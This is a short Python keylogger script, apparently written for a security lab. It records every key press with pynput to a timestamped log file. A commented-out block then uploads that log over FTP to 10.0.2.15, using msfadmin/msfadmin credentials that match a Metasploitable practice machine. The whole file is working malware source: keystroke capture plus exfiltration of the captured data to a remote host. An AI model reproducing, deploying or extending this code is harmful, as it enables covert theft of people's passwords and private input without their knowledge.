from pynput import keyboard #handle keyboard events
import ftplib
import logging  #for saving to file

logdir=''   #dirc of keylogger output- current dirc

logging.basicConfig(filename=(logdir+'klog-res.txt'),level=logging.DEBUG,format='%(asctime)s:%(message)s')

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print('A special key {0} has been pressed.'.format(key))    

def releasing_key(key):
    if key == keyboard.Key.esc:
        return False

print('\nStarted listening...\n')

with keyboard.Listener(on_press=pressing_key,on_release=releasing_key) as listener:
    listener.join()

print('\nConnecting to ftp and sending the data....')
'''
sess= ftplib.FTP('10.0.2.15','msfadmin','msfadmin')      #initiang ftp session
file= open('klog-res.txt','rb')   #opening file in read binary mode
sess.storbinary('STOR klog-res.txt',file)
file.close()
sess.quit()'''